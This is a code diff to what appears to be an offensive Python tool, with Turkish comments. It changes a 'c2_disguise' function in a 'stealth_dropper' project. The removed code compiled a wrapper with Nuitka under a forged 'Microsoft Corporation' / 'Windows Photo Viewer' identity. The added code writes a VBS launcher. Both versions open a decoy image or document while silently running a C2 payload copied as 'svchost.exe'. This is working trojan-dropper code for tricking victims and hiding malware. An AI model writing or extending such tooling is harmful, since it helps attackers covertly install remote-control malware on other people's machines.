@@ -583,69 +583,34 @@ def c2_disguise():
     print(f"\n{C.DIM}  [*] Yem dosya: EXE açılınca gösterilecek gerçek resim/doküman (opsiyonel){C.RESET}")
     decoy_path = input(f"{C.CYAN}  [?] Yem dosya yolu (boş = yem yok): {C.RESET}").strip().strip('"')
 
-    # 5. Yem dosyayı EXE'ye göm (varsa)
+    # 5. Hazırla
+    import shutil
+    final_exe = exe_path
+
     if decoy_path and os.path.exists(decoy_path):
-        print(f"{C.YELLOW}  [*] Yem dosya ile wrapper oluşturuluyor...{C.RESET}")
+        print(f"{C.YELLOW}  [*] Yem dosya ile paket oluşturuluyor...{C.RESET}")
         decoy_ext = os.path.splitext(decoy_path)[1]
-        decoy_name = "decoy" + decoy_ext
-        payload_name = "payload.exe"
 
-        # Dosyaları stealth_dropper'a kopyala
-        import shutil
-        decoy_copy = os.path.join('stealth_dropper', decoy_name)
-        payload_copy = os.path.join('stealth_dropper', payload_name)
-        shutil.copy2(decoy_path, decoy_copy)
-        shutil.copy2(exe_path, payload_copy)
+        # Çıkış klasörü
+        pkg_dir = os.path.join('stealth_dropper', 'disguise_pkg')
+        os.makedirs(pkg_dir, exist_ok=True)
 
-        # Wrapper: dosyaları temp'e çıkar ve çalıştır
-        wrapper_code = f'''import sys,os,subprocess,tempfile,shutil
-try:
-    if sys.stdout is None: sys.stdout=open(os.devnull,"w")
-    if sys.stderr is None: sys.stderr=open(os.devnull,"w")
-except: pass
-tmp=tempfile.gettempdir()
-# Bundled dosyalari bul
-if getattr(sys,"frozen",False):
-    base=os.path.dirname(sys.executable)
-else:
-    base=os.path.dirname(__file__)
-# Yem dosyayi ac
-decoy_src=os.path.join(base,"{decoy_name}")
-decoy_dst=os.path.join(tmp,"preview{decoy_ext}")
-if os.path.exists(decoy_src):
-    shutil.copy2(decoy_src,decoy_dst)
-    os.startfile(decoy_dst)
-# Payload calistir
-pay_src=os.path.join(base,"{payload_name}")
-pay_dst=os.path.join(tmp,"svchost.exe")
-if os.path.exists(pay_src):
-    shutil.copy2(pay_src,pay_dst)
-    subprocess.Popen([pay_dst],creationflags=0x08000000)
+        # Dosyaları kopyala
+        decoy_dest = os.path.join(pkg_dir, f"preview{decoy_ext}")
+        exe_dest = os.path.join(pkg_dir, "svchost.exe")
+        shutil.copy2(decoy_path, decoy_dest)
+        shutil.copy2(exe_path, exe_dest)
+
+        # VBS launcher: yem dosyayı aç + EXE'yi gizli çalıştır
+        vbs_code = f'''Set WshShell = CreateObject("WScript.Shell")
+Set fso = CreateObject("Scripting.FileSystemObject")
+myDir = fso.GetParentFolderName(WScript.ScriptFullName)
+WshShell.Run Chr(34) & myDir & "\\preview{decoy_ext}" & Chr(34), 1, False
+WshShell.Run Chr(34) & myDir & "\\svchost.exe" & Chr(34), 0, False
 '''
-        wrapper_path = os.path.join('stealth_dropper', '_wrapper.py')
-        save_text(wrapper_path, wrapper_code)
-
-        # Nuitka ile derle — dosyaları --include-data-files ile göm
-        print(f"{C.YELLOW}  [*] Nuitka ile derleniyor...{C.RESET}")
-        final_exe = os.path.join('stealth_dropper', 'disguised.exe')
-        result = subprocess.run(
-            [sys.executable, '-m', 'nuitka',
-             '--onefile', '--windows-console-mode=disable',
-             '--output-dir=stealth_dropper',
-             '--output-filename=disguised.exe',
-             '--remove-output',
-             '--assume-yes-for-downloads',
-             '--windows-company-name=Microsoft Corporation',
-             '--windows-product-name=Windows Photo Viewer',
-             f'--include-data-files={os.path.abspath(decoy_copy)}={decoy_name}',
-             f'--include-data-files={os.path.abspath(payload_copy)}={payload_name}',
-             wrapper_path],
-            capture_output=True, text=True
-        )
-        # Temizlik
-        for f in [wrapper_path, decoy_copy, payload_copy]:
-            try: os.remove(f)
-            except: pass
+        vbs_path = os.path.join(pkg_dir, "open.vbs")
+        save_text(vbs_path, vbs_code)
+        final_exe = os.path.join(pkg_dir, "open.vbs")
     else:
         final_exe = exe_path
 
